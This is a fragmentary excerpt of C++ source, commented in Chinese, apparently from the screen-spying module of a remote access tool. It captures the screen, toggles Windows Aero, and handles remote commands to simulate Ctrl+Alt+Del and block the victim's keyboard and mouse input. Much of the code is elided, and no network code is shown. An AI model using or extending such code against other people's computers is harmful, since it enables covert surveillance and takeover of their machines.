...
// 	m_pScreenSpy = new CScreenSpy(8);
	m_biBitCount = 3;//默认4位灰度
	m_pScreenSpy = new CScreenSpy(4, true);//默认4位灰度
//	m_biBitCount = 1;//默认1位黑白
//	m_pScreenSpy = new CScreenSpy(1);//默认1位黑白
	m_bIsWorking = true;
...
bool IsCompositionEnabled()//判断是否开启Aero
{
	typedef HRESULT
		(WINAPI
		*DwmIsCompositionEnabledT)(
		__out BOOL* pfEnabled
		);
	
	DwmIsCompositionEnabledT pDwmIsCompositionEnabled=(DwmIsCompositionEnabledT)GetProcAddress(LoadLibrary("Dwmapi.dll"),"DwmIsCompositionEnabled");
...
void OpenWin7Basic() // win7屏幕加速~开始
{
	typedef HRESULT
		(WINAPI
		*DwmEnableCompositionT)(
		UINT uCompositionAction
		);
	DwmEnableCompositionT pDwmEnableComposition=(DwmEnableCompositionT)GetProcAddress(LoadLibrary("Dwmapi.dll"),"DwmEnableComposition");
	
	if (IsCompositionEnabled())
	{
		pDwmEnableComposition(0);//关闭basic主题
	}
	else
	{
		pDwmEnableComposition(1);//开启basic主题
	}
}
void Win7Basic() // win7屏幕加速
{
	HMODULE library = LoadLibrary("dwmapi.dll");//没有dwmapi.dll何来的win7/vista
    if (library != NULL)
    {
...
//				OutputDebugString("ok");
		...
		case COMMAND_SCREEN_CTRL_ALT_DEL1:
			::SimulateCtrlAltDel();
			break;
		case COMMAND_SCREEN_BLOCK_INPUT1: //ControlThread里锁定
...
void CScreenManager::sendBITMAPINFO()
{
	...
	lpBuffer[0] = TOKEN_OLDBITMAPINFO;
